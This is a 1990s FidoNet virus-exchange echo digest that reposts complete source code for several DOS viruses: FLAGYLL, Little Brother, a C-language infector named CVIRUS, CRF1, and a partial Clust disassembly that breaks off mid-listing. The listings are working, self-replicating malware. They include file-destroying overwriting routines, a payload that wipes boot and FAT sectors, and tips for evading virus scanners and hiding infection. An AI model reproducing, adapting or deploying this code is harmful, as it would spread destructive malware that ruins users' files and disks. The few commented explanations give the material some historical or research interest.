@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
;FLAGYLL virus - edited for Crypt Newsletter 13
;FLAGYLL is a memory resident, overwriting virus which
;infects and destroys .EXE files on load.
;It updates the infected files time/date stamps to the time of
;infection so it can easily be followed.
;.EXE's infected by FLAGYLL are destroyed.  DOS will either
;refuse to load them or FLAGYLL will become resident
;as they execute.  These programs are ruined and can only
;be deleted. Because it is so destructive to files, FLAGYLL cannnot
;pose a threat in the wild, and in this respect, it is much
;inferior to the SUSAN virus included in this issue.

           .radix 16
     cseg       segment
        model  small
        assume cs:cseg, ds:cseg, es:cseg

        org 100h

oi21            equ endflagyll
filelength      equ endflagyll - begin
nameptr         equ endflagyll+4
DTA             equ endflagyll+8







begin:          jmp     install_flagyll



                         ; install
install_flagyll:

        mov     ax,cs                    ; reduce memory size
        dec     ax
        mov     ds,ax
        cmp     byte ptr ds:[0000],5a    ; check if last memory
        jne     cancel                   ; block
        mov     ax,ds:[0003]
        sub     ax,100                   ; decrease memory
        mov     ds:0003,ax


copy_flagyll:
        mov     bx,ax                    ; copy to claimed block
        mov     ax,es                    ; PSP
        add     ax,bx                    ; virus start in memory
        mov     es,ax
        mov     cx,offset endflagyll - begin  ; cx = length of virus
        mov     ax,ds                    ; restore ds
        inc     ax
        mov     ds,ax
        lea     si,ds:[begin]            ; point to start of virus
        lea     di,es:0100               ; point to destination
        rep     movsb                    ; copy virus in memory



hook_21:

        mov     ds,cx                   ; hook interrupt 21h
        mov     si,0084h                ;
        mov     di,offset oi21
        mov     dx,offset check_exec
        lodsw
        cmp     ax,dx                   ;
        je      cancel                  ; exit, if already installed
        stosw
        movsw

        push    es
        pop     ds
        mov     ax,2521h                ; revector int 21h to virus
        int     21h

cancel:         ret

check_exec:                                    ; look over loaded files
        pushf                          ; for executables

        push    es                     ; push everything onto the
        push    ds                     ; stack
        push    ax
        push    bx
        push    dx

        cmp     ax,04B00h               ; is a file being
                        ; executed ?


        jne     abort                   ; no, exit

do_infect:
        call    infect                  ; then try to infect

abort:                                        ; restore everything
        pop     dx
        pop     bx
        pop     ax
        pop     ds
        pop     es
        popf

exit:
                         ; exit
        jmp     dword ptr cs:[oi21]

infect:
        jmp     over_id              ; it's a vanity thing

note:           db      '-=[Crypt Newsletter 13]=-'


over_id:



        mov     cs:[name_seg],ds       ; this routine
        mov     cs:[name_off],dx       ; essentially grabs
                           ; the name of the file
        cld                             ; clear direction flags
        mov     word ptr cs:[nameptr],dx ; save pointer to the filename
        mov     word ptr cs:[nameptr+2],ds

        mov     ah,2Fh                    ; get old DTA
        int     21h
        push    es
        push    bx

        push    cs                        ; set new DTA

        pop     ds
        mov     dx,offset DTA
        mov     ah,1Ah
        int     21h

        call    host_ident              ; find filename for virus
        push    di
        mov     si,offset COM_txt       ; is extension 'COM' ?

        mov     cx,3
     rep    cmpsb
        pop     di
        jz      return                  ; if so, let it pass by
        mov     si,offset EXE_txt       ; is extension .EXE ?
        nop
        mov     cl,3
        rep     cmpsb
        jnz     return



do_exe:                                      ; infect host, destroying it

        mov     ax,4300h             ; clear attributes
        mov     ds,cs:[name_seg]
        mov     dx,cs:[name_off]
        int     21h
        and     cl,0FEh
        mov     ax,4301h
        int     21h

        mov     ds,cs:[name_seg]   ; open file read/write
        mov     dx,cs:[name_off]
        mov     ax,3D02h
        int     21h
        jc      close_file
        push    cs
        pop     ds
        mov     [handle],ax
        mov     bx,ax

        push    cs
        pop     ds
        mov     ax,4200h       ;set pointer to beginning of host

        push    cs
        pop     ds
        mov     bx,[handle]    ;handle to BX
        xor     cx,cx
        xor     dx,dx
        int     21h



        mov     ah,40          ;write to file
        mov     cx,filelength  ;virus length in cx
        mov     dx,100         ;start write at beginning of Flagyll
        int     21h            ;do it

close_file:     mov     bx,[handle]
        mov     ah,03Eh        ;close file, name -->BX
        int     21h

        mov     ax,4C00h       ;exit to DOS
        int     21h




return:         mov     ah,1Ah
        pop     dx              ; restore old DTA
        pop     ds
        int     21H

        ret                     ; let DOS regain control


host_ident:     les     di,dword ptr cs:[nameptr]  ; finds filename for
        mov     ch,0FFh                    ; host selection
        mov     al,0
     repnz  scasb
        sub     di,4
        ret




EXE_txt         db  'EXE',0      ; extension masks
COM_txt         db  'COM',0      ; for host selection

name_seg        dw  ?            ;data buffers for
name_off        dw  ?            ; viral use on the fly
handle          dw  ?

note2:           db     'Flagyll'     ; virus name

endflagyll:

cseg            ends
        end begin

-+-  GEcho 1.10+
 + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/3            Enable 32-bit processing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 68 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15 
 To   : -  *.*  -                                                               
 Subj : LTBRO299.DSM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fd1
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Alan Jones, 2:283/718 (06 Nov 94 17:40)
* To   : Daniel Hendry
* Subj : LTBRO299.DSM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Alan.Jones@f718.n283.z2.fidonet.org
;Little Brother - resident companion virus, 299 bytes.

;This virus stores itself inside DOS's data block, over the root directory
;copy.  It hooks int 21h, function 4bh (subfunct. 0, load & exec) and
;creates a function 0deh for self identification.  When a file is run,
;it first checks to see if it is a COM or an EXE.  If it is an EXE, it
;will create a COM file with the same filename.  Otherwise - if it is a
;COM, it will check to see if it is the virus by checking the size of the
;file and seeing if there is an EXE with the same (starting) filename.
;If so, it will change the filename to be run to the EXE host and allow
;DOS to execute it.  This virus may cause errors (?) due to the place
;in memory it locates itself.

;Disassembly by Black Wolf.

.model tiny
.code
     org     100h

start_virus:
     cld
     mov     ax,0DEDEh            ;Installation Check
     int     21h
     cmp     ah,41h
     je      Exit_Virus           ;If there - terminate

     mov     ax,44h
     mov     es,ax
     mov     di,100h                   ;Copy virus to 0044:0100
     mov     si,di                     ;Root directory entries?
     mov     cx,end_virus-start_virus  ;This is inside DOS data
     rep     movsb                     ;block... may cause errors?

     mov     ds,cx                ;DS = 0 = Interrupt table
     mov     si,84h               ;0:84h = Int 21h entry in table

     mov     di,offset Old21_IP   ;Save old Int 21h address
     movsw
     movsw

     push    es
     pop     ds                   ;Set DS to new seg...

     mov     dx,offset Int21_Handler
     mov     ax,2521h
     int     21h                  ;Hook Int 21h.

Exit_Virus:
     retn                         ;Terminate


EXE_Mask        db      'EXE',0
COM_Mask        db      'COM',0

CritErrHandler:
     mov     al,3
     iret

Int21_Handler:
     pushf
     cmp     ax,0DEDEh               ;Is this an installation
     je      Install_Check           ;check call?

     push    dx bx ax ds es          ;Save regs....

     cmp     ax,4B00h                ;Is it load and execute?
     jne     Exit_21h                ;No... exit handler
     call    Infect_File             ;Yes... infect file

Exit_21h:
     pop     es ds ax bx dx
     popf
     jmp     dword ptr cs:[Old21_IP]     ;Jump to Old Int 21h

Install_Check:
     mov     ax,4101h
     popf
     iret

Infect_File:
     cld
     mov     word ptr cs:[Filename_off],dx  ;Save filename offset
     mov     word ptr cs:[Filename_seg],ds  ;and segment.
     push    cs
     pop     ds
     mov     dx,offset VirusDTA
     mov     ah,1Ah
     int     21h                     ;Set DTA to us...

     call    Find_Extension

     mov     si,offset ds:[EXE_Mask]
     mov     cx,3
     repe    cmpsb                   ;Is it an EXE file?
     jnz     Not_EXE

     mov     si,offset COM_Mask
     call    Change_Ext              ;Change extension to COM

     mov     ax,3300h
     int     21h                     ;Get Ctrl-Break Status
     push    dx                      ;Save it....

     xor     dl,dl
     mov     ax,3301h
     int     21h                     ;Disable Ctrl-Break.

     mov     ax,3524h
     int     21h                     ;Get Int 24h handler's address

     push    bx
     push    es                      ;Save it for later...

     push    cs
     pop     ds                      ;DS = virus segment

     mov     dx,offset CritErrHandler
     mov     ax,2524h
     int     21h                     ;Set Critical Error handler.


     lds     dx,dword ptr ds:[Filename_Off]    ;DS:DX = filename
     xor     cx,cx                             ;Reg attributes
     mov     ah,5Bh
     int     21h                               ;Create File..
     jc      Done_Infect

     xchg    ax,bx
     push    cs
     pop     ds

     mov     cx,end_virus-start_virus
     mov     dx,100h
     mov     ah,40h
     int     21h                     ;Write entire virus

     cmp     ax,cx                   ;did it all write?

     pushf
     mov     ah,3Eh                  ;Close file.
     int     21h
     popf

     jz      Done_Infect             ;Yes, go Done_Infect

     lds     dx,dword ptr ds:[Filename_Off]
     mov     ah,41h
     int     21h                     ;Delete file, incomplete
                     ;write or write error.

Done_Infect:
     pop     ds
     pop     dx
     mov     ax,2524h
     int     21h                 ;Restore Critical error handler

     pop     dx                  ;Get old CTRL-Break handler
     mov     ax,3301h            ;status and restore it.
     int     21h

     mov     si,offset EXE_Mask
     call    Change_Ext          ;Change extension back to orig.

Leave_Infect:
     retn

Not_EXE:
     call    Locate_File
     cmp     word ptr cs:[24dh], end_virus-start_virus
     jne     Leave_Infect    ;Is the file size right for Virus?

     mov     si,offset EXE_Mask     ;If so, is there an EXE of the same
     call    Change_Ext            ;name as the COM file?
     call    Locate_File
     jnc     Leave_Infect          ;If not exit, otherwise - is already
     mov     si,offset COM_Mask    ;infected, so change extension
     jmp     short Change_Ext      ;to run uninfected program.


Locate_File:
     lds     dx,dword ptr ds:[Filename_Off]
     mov     cl,27h
     mov     ah,4Eh
     int     21h                     ;Find First Filename match.
     retn


Change_Ext:
     call    Find_Extension
     push    cs
     pop     ds
     movsw
     movsw
     retn

Find_Extension:
     les     di,dword ptr cs:[Filename_Off]
     mov     ch,0FFh
     mov     al,2Eh        ;Scan through filename until a '.'
     repne   scasb
     retn

Virus_Name      db      'Little Brother',0

end_virus:

Old21_IP        dw      ?
Old21_CS        dw      ?

Filename_Off    dw      ?
Filename_Seg    dw      ?

VirusDTA:
end     start_virus

-+-  FMail 0.96т
 + Origin: **SERMEDITECH BBS** Soissons FR (+33) 23.73.02.51 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/v            Include full symbolic debug information

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 69 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15 
 To   : -  *.*  -                                                               
 Subj : CVIRUS21.C                                                              
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fd7
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Clif Jessop, 2:283/718 (06 Nov 94 17:40)
* To   : Mike Salvino
* Subj : CVIRUS21.C
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Clif.Jessop@f718.n283.z2.fidonet.org
 /* C-Virus:  A generic .COM and .EXE infector
    Written by Nowhere Man
    October 2, 1991
    Version 2.1
  */

#include <dir.h>
#include <dos.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>


 /* Note that the #define TOO_SMALL is the minimum size of the .EXE or .COM
    file which CVIRUS can infect without increasing the size of the
    file. (Since this would tip off the victim to CVIRUS's presence, no
    file under this size will be infected.)  It should be set to the
    approximate size of the LZEXEd .EXE file produced from this code, but
    always a few bytes larger.  Why?  Because this way CVIRUS doesn't need
    to check itself for previous infection, saving time.

    SIGNATURE is the four-byte signature that CVIRUS checks for to prevent
    re-infection of itself.
 */

#ifdef DEBUG
#define TOO_SMALL 6000
#else
#define TOO_SMALL 4735
#endif

#define SIGNATURE "NMAN"

  /* The following is a table of random byte values.  Be sure to constantly
     change this to prevent detection by virus scanners, but keep it short
     (or non-exsistant) to keep the code size down.
  */

  char screw_virex[] = "\xF5\x23\x72\x96\x54\xFA\xE3\xBC\xCD\x04";

void hostile_activity(void)
{
  /* Put whatever you feel like doing here...
     I chose to make this routine trash the victim's boot, FAT,
     and directory sectors, but you can alter this code however you want,
     and are encouraged to do so.
  */


#ifdef DEBUG
       puts("\aAll files infected!");
       exit(1);
#else

  /* Overwrite five sectors, starting with sector 0, on C:, with the
     memory at location DS:0000 (random garbage).
  */

  abswrite(2,5,0,(void *) 0);
  __emit__(0xCD, 0x19);   // Reboot computer

#endif

}

int infected(char *fname)
{
   /* This function determines if fname is infected.  It reads four
      bytes 28 bytes in from the start and checks them agains
      the current header. 1 is returned if the file is already infected,
      0 if it isn't.
   */

      register int handle;
      char virus_signature[35];
      static char check[] = SIGNATURE;

      handle = _open(fname, O_RDONLY);
      _read(handle, virus_signature,
      sizeof(virus_signature));
      close(handle);

#ifdef DEBUG
       printf("Signature for %s: %.4s\n", fname, &virus_signature[28]);
#endif

   /* This next bit may look really stupid, but it actually saves about
      100 bytes.
   */

   return((virus_signature[30] == check[2]) && (virus_signature[31] ==
check[3]));
}

void spread(char *virus, struct ffblk *victim)
{
  /* This function infects victim with virus.  First, the victim's
     attributes are set to 0.  Then the virus is copied into the victim's
     file name.  Its attributes, file date/time, and size are set to that
     of the victim's, preventing detection, and the files are closed.
  */

  register int virus_handle, victim_handle;
  unsigned virus_size;
  char virus_code[TOO_SMALL + 1], *victim_name;

  /* This is used enought to warrant saving it in a separate variable */

  victim_name = victim->ff_name;


#ifdef DEBUG
       printf("Infecting %s with %s...\n", victim_name, virus);
#endif

     /* Turn off all of the victim's attributes so it can be replaced */

     _chmod(victim_name, 1, 0);


#ifdef DEBUG
       puts("Ok so far...");
#endif


           /* Recreate the victim */

           virus_handle = _open(virus, O_RDONLY);
           victim_handle = _creat(victim_name, victim->ff_attrib);


           /* Copy virus */

           virus_size = _read(virus_handle, virus_code, sizeof(virus_code));
           _write(victim_handle, virus_code, virus_size);

#ifdef DEBUG
       puts("Almost done...");
#endif

           /* Reset victim's file date, time, and size */

           chsize(victim_handle, victim->ff_fsize);
           setftime(victim_handle, (struct ftime *) &victim->ff_ftime);


           /* Close files */

           close(virus_handle);
           close(victim_handle);

#ifdef DEBUG
       puts("Infection complete!");
#endif
}

struct ffblk *victim(void)
{
   /* This function returns a pointer to the name of the virus's next
      victim.  This routine is set up to try to infect .EXE and .COM
      files.  If there is a command line argument, it will try to
      infect that file instead. If all files are infected, hostile
      activity is initiated...
   */

    register char **ext;
    static char *types[] = {"*.EXE", "*.COM", NULL};
    static struct ffblk ffblk;
    int done;

  for (ext = (*++_argv) ? _argv : types; *ext; ext++)
  {
    for (ext = (*++_argv) ? _argv : types; *ext; ext++)
    {
       done = findfirst(*ext, &ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM |
FA_ARCH);
       while (!done) {
#ifdef DEBUG
       printf("Scanning %s...\n", ffblk.ff_name);
#endif

         /* If you want to check for specific days of the week, months,
            etc.... here is the place to insert the code (don't forget to
            "#include <time.h>").
         */

       if ((ffblk.ff_fsize > TOO_SMALL) && (!infected(ffblk.ff_name)))
           return(&ffblk);

          done = findnext(&ffblk);
        }
     }
   }
     /* If there are no files left to infect, have a little fun */

     hostile_activity();
     return(0);
}

int main(int argc, char *argv[])
{
    /* In the main program, a victim is found and infected. If all files
       are infected, a malicious action is performed.  Otherwise, a bogus
       error message is displayed, and the virus terminates with code
       1, simulating an error.
    */

  char *err_msg[] = { "Out of memory",
                      "Bad EXE format",
                      "Invalid DOS version",
                      "Bad memory block",
                      "FCB creation error",
                      "Sharing violation",
                      "Abnormal program termination",
                      "Divide error",
                    };

     char *virus_name;
     spread(argv[0], victim());
     puts(err_msg[peek(0, 0x46C) % (sizeof(err_msg) / sizeof(char *))]);
     return(1);
}

-+-  GEcho 1.00
 + Origin: Stop creating them! Virusses aren't great! (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/d            Warn if duplicate symbols in libraries

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 70 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15 
 To   : -  *.*  -                                                               
 Subj : CRF.ASM                                                                 
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fdd
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Fred Lee, 2:283/718 (06 Nov 94 17:46)
* To   : Mike Nisbett
* Subj : CRF.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
    title "CRF1 virus.  Born on the Fourth of July.  Written by TBSI."
                            page 60,80
code segment                        word public 'code'
                            assume cs:code,ds:code
                            org 100h
main proc;edure


; As referenced in this source listing, Top-Of-File represents location 100h in
; the current memory segment, which is where the virus code is loaded into mem.
; The word "program" refers to the infected programs code and "virus" refers to
; the virus's code.  This information is included to clarify my use of the word
; "program" in the remarks throughout this listing.

; Since the virus (with the exception of "call skip" and "db 26") can be loaded
; anywhere in memory depending on the length of the infected program, I made it
; to where the BP register would be loaded with the displacement of the code in
; memory.  This was done as follows:
;             1) a CALL instruction was issued.  It places the TRUE return
;                 address onto the stack.
;             2) instead of returning to there, the value was popped off of
;                 the stack into the BP register
;             3) then, it subtracts the EXPECTED value of BP (the address of
;                 EOFMARK in the 1st-time copy) from BP to get the offset.
;             4) all references to memory locations were thereafter changed
;                 to refernces to EXPECTED memory locations + BP
; This fixed the problem.




tof:                            ;Top-Of-File
        jmp short begin         ;Skip over program
        nop                 ;Reserve 3rd byte
EOFMARK:    db  26              ;Disable DOS's TYPE

first_four: nop                 ;First run copy only!
address:    int 20h             ;First run copy only!
check:      nop                 ;First run copy only!

begin:      call    nextline            ;Push BP onto stack
nextline:   pop bp              ;BP=location of Skip
        sub bp,offset nextline      ;BP=offset from 1st run

        mov byte ptr [bp+offset infected],0 ;Reset infection count

        lea si,[bp+offset first_four]   ;Original first 4 bytes
        mov di,offset tof           ;TOF never changes
        mov cx,4                ;Lets copy 4 bytes
        cld                 ;Read left-to-right
        rep movsb               ;Copy the 4 bytes

        mov ah,1Ah              ;Set DTA address ...
        lea dx,[bp+offset DTA]      ; ... to *our* DTA
        int 21h             ;Call DOS to set DTA

        mov ah,4Eh              ;Find First ASCIIZ
        lea dx,[bp+offset filespec]     ;DS:DX -} '*.COM',0
        lea si,[bp+offset filename]     ;Point to file
        push    dx              ;Save DX
        jmp short continue          ;Continue...

return:     mov ah,1ah              ;Set DTA address ...
        mov dx,80h              ; ... to default DTA
        int 21h             ;Call DOS to set DTA
        xor ax,ax               ;AX= 0
        mov bx,ax               ;BX= 0
        mov cx,ax               ;CX= 0
        mov dx,ax               ;DX= 0
        mov si,ax               ;SI= 0
        mov di,ax               ;DI= 0
        mov sp,0FFFEh           ;SP= 0
        mov bp,100h             ;BP= 100h (RETurn addr)
        push    bp              ; Put on stack
        mov bp,ax               ;BP= 0
        ret                 ;JMP to 100h

nextfile:   or  bx,bx               ;Did we open the file?
        jz  skipclose           ;No, so don't close it
        mov ah,3Eh              ;Close file
        int 21h             ;Call DOS to close it
        xor bx,bx               ;Set BX back to 0
skipclose:  mov ah,4Fh              ;Find Next ASCIIZ

continue:   pop dx              ;Restore DX
        push    dx              ;Re-save DX
        xor cx,cx               ;CX= 0
        xor bx,bx
        int 21h             ;Find First/Next
        jnc skipjmp
        jmp NoneLeft            ;Out of files

skipjmp:    mov ax,3D02h            ;open file
        mov dx,si               ;point to filespec
        int 21h             ;Call DOS to open file
        jc  nextfile            ;Next file if error

        mov bx,ax               ;get the handle
        mov ah,3Fh              ;Read from file
        mov cx,4                ;Read 4 bytes
        lea dx,[bp+offset first_four]   ;Read in the first 4
        int 21h             ;Call DOS to read

        cmp byte ptr [bp+offset check],26   ;Already infected?
        je  nextfile            ;Yep, try again ...
        cmp byte ptr [bp+offset first_four],77  ;Mis-named .EXE?
        je  nextfile            ;Yep, maybe next time!

        mov ax,4202h            ;LSeek to EOF
        xor cx,cx               ;CX= 0
        xor dx,dx               ;DX= 0
        int 21h             ;Call DOS to LSeek

        cmp ax,0FD00h           ;Longer than 63K?
        ja  nextfile            ;Yep, try again...
        mov [bp+offset addr],ax     ;Save call location

        mov ah,40h              ;Write to file
        mov cx,4                ;Write 4 bytes
        lea dx,[bp+offset first_four]   ;Point to buffer
        int 21h             ;Save the first 4 bytes

        mov ah,40h              ;Write to file
        mov cx,offset eof-offset begin  ;Length of target code
        lea dx,[bp+offset begin]        ;Point to virus start
        int 21h             ;Append the virus

        mov ax,4200h            ;LSeek to TOF
        xor cx,cx               ;CX= 0
        xor dx,dx               ;DX= 0
        int 21h             ;Call DOS to LSeek

        mov ax,[bp+offset addr]     ;Retrieve location
        inc ax              ;Adjust location

        mov [bp+offset address],ax      ;address to call
        mov byte ptr [bp+offset first_four],0E9h  ;JMP rel16 inst.
        mov byte ptr [bp+offset check],26   ;EOFMARK

        mov ah,40h              ;Write to file
        mov cx,4                ;Write 4 bytes
        lea dx,[bp+offset first_four]   ;4 bytes are at [DX]
        int 21h             ;Write to file

        inc byte ptr [bp+offset infected]   ;increment counter
        jmp nextfile            ;Any more?

NoneLeft:   cmp byte ptr [bp+offset infected],2 ;At least 2 infected?
        jae TheEnd              ;The party's over!

        mov di,100h             ;DI= 100h
        cmp word ptr [di],20CDh     ;an INT 20h?
        je  TheEnd              ;Don't go to prev. dir.

        lea dx,[bp+offset prevdir]      ;'..'
        mov ah,3Bh              ;Set current directory
        int 21h             ;CHDIR ..
        jc  TheEnd              ;We're through!
        mov ah,4Eh
        jmp continue            ;Start over in new dir

TheEnd:     jmp return              ;The party's over!

filespec:   db  '*.COM',0           ;File specification
prevdir:    db  '..',0              ;previous directory

; None of this information is included in the virus's code.  It is only used
; during the search/infect routines and it is not necessary to preserve it
; in between calls to them.

eof:
DTA:        db  21 dup (?)          ;internal search's data

attribute   db  ?               ;attribute
file_time   db  2 dup (?)           ;file's time stamp
file_date   db  2 dup (?)           ;file's date stamp
file_size   db  4 dup (?)           ;file's size
filename    db  13 dup (?)          ;filename

infected    db  ?               ;infection count

addr        dw  ?               ;Address

                            main endp;rocedure
                            code ends;egment

            end main
; ─────────────────────────────────────────────────────────────────────────
; ────────────────────> and Remember Don't Forget to Call <────────────────
; ────────────> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <──────────
; ─────────────────────────────────────────────────────────────────────────

-+-  GEcho 1.00
 + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

Options:      /m = map file with publics

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 71 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15 
 To   : -  *.*  -                                                               
 Subj : CLUST.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fe4
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mike Salvino, 2:283/718 (06 Nov 94 17:48)
* To   : Daniel Hendry
* Subj : CLUST.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mike.Salvino@f718.n283.z2.fidonet.org
;Clust Virus from TridenT research group - small but fairly interesting,
;it's one of the more advanced from TridenT that I've seen with the
;possible exception of the TPE.

;This virus goes memory resident at the top of lower memory and hooks
;Int 13h.  Whenever an EXE file header is written, it checks to see
;if there is a large field of 0's inside it (VERY common in EXE's)
;and, if so, will put itself inside it and change the exe marker bytes
;'MZ' to a jump to that code.  In this way, it effectively converts the
;file to a COM file when it is run.  After this it re-executes the EXE
;file.  Because of a stealth handler on Int 13h function 2 (absolute
;disk read) the EXE file is read as it originally was (the handler
;zero's out the field in which it resides and restores the jump to
;'MZ').  Because of the way this virus works, it can only infect
;smaller EXE files.

;NOTE:
;Several commands are commented out and have the actual bytes entered
;next to them instead. This is because the compiler that Clust was
;originally compiled on used different translations than mine, and
;I wished to preserve the EXACT virus code.

;Disinfection: Because of this virus' stealth routine, disinfection should
;              be possible simply by Zipping or Arjing all EXE files on an
;              infected disk, then rebooting from a clean disk and unarchiving
;              the files.  The original archiving MUST be done while the
;              virus is active in memory.  Also - after rebooting - make
;              sure the program you use to unarchive the files is _NOT_
;              infected.

;Disassembly by Black Wolf

.model tiny
.code
        org     100h

start:
        jmp     short EntryPoint

LotsaNOPs       db      122 dup (90h)   ;Usually will be EXE header....

OldInt13        dd      0

EntryPoint:
        db      0e9h,7ch,0      ;jmp     InstallVirus

Int13Handler:
        cmp     ah,3
        je      IsDiskWrite

        cmp     ah,2
        jne     GoInt13

        pushf
        call    cs:OldInt13               ;Call Int 13h

        jc      Exit13Handler             ;Exit on error.

        cmp     word ptr es:[bx],7EEBh    ;Is sector infected?
        jne     Exit13Handler

        mov     word ptr es:[bx],5A4Dh    ;Cover mark with 'MZ'

        push    di cx ax                  ;Stealth routine.....
        mov     cx,115h
        xor     ax,ax
        db      89h,0dfh                  ;mov     di,bx

                          ;Zero out virus from
        add     di,80h                    ;sector when it is read.
        rep     stosb
        pop     ax cx di

Exit13Handler:
        iret
GoInt13:
        jmp     cs:[OldInt13]
IsDiskWrite:
        cmp     word ptr es:[bx],5A4Dh  ;Is EXE file being written?
        jne     GoInt13

        cmp     word ptr es:[bx+4],75h  ;Is file too large?
        jae     GoInt13

        push    ax cx si di ds
        push    es
        pop     ds
        db      89h,0deh                 ;mov     si,bx

        add     si,80h                   ;Look in EXE header....
        mov     cx,115h
AllZeros:
        lodsb
        cmp     al,0
        loopz   AllZeros

        cmp     cx,0                    ;Check to see if entire field
        jne     ExitInfectHandler       ;was zeroed - leave if not.


        db      89h,0dfh                  ;mov     di,bx
        add     di,80h
        mov     cx,115h
        mov     si,offset OldInt13
        push    cs
        pop     ds
        rep     movsb

        db      89h,0dfh                ;mov     di,bx

                        ;Copy virus
                        ;over zero area in EXE header.
        mov     ax,7EEBh                ;Stick in Jump over 'MZ'
        stosw

ExitInfectHandler:
        pop     ds di si cx ax          ;Allow Write to process now.
        jmp     short GoInt13

InstallVirus:
        mov     ax,3513h
        int     21h                     ;Get Int 13 addres
        mov     word ptr cs:[OldInt13],bx
        mov     word ptr cs:[OldInt13+2],es

        mov     ah,0Dh
        int     21h                     ;Flush disk buffers

        mov     ah,36h
        mov     dl,0
        int     21h                  ;Get free space on default drive

        mov     ax,cs
        dec     ax
        mov     ds,ax
        cmp     byte ptr ds:0,'Z'       ;Are we the last chain?
        jne     Terminate               ;If not, terminate.

        ;sub     word ptr ds:[3],39h     ;subtract from MCB size
        db      81h,2eh,03,0,39h,0

        ;sub     word ptr ds:[12h],39h   ;subtract from PSP TopOfMem
        db      81h,2eh,12h,0,39h,0

        mov     si,offset OldInt13

        db      89h,0f7h                ;mov     di,si

        mov     es,ds:[12h]             ;ES = new segment
        push    cs
        pop     ds
        mov     cx,115h                 ;Copy virus into memory
        rep     movsb

        mov     ax,2513h
        push    es
        pop     ds
        mov     dx,offset Int13Handler
        int     21h                     ;Set int 13 to virus handler

        mov     ah,4Ah
        push    cs
        pop     es
        mov     bx,39h
        int     21h                     ;Modify mem alloc.

        push    cs
        pop     ds
        mov     bx,ds:[2ch]             ;Get environment segment
        mov     es,bx
        xor     ax,ax
        mov     di,1

ScanForFilename:                                ;Find name of file executed
        dec     di                      ;in environment strings...
        scasw                           ;(located after two 0's)
        jnz     ScanForFilename

        lea     si,[di+2]
        push    bx
        pop     ds                      ;DS = environment segment

        push    cs
        pop     es                      ;ES = code segment

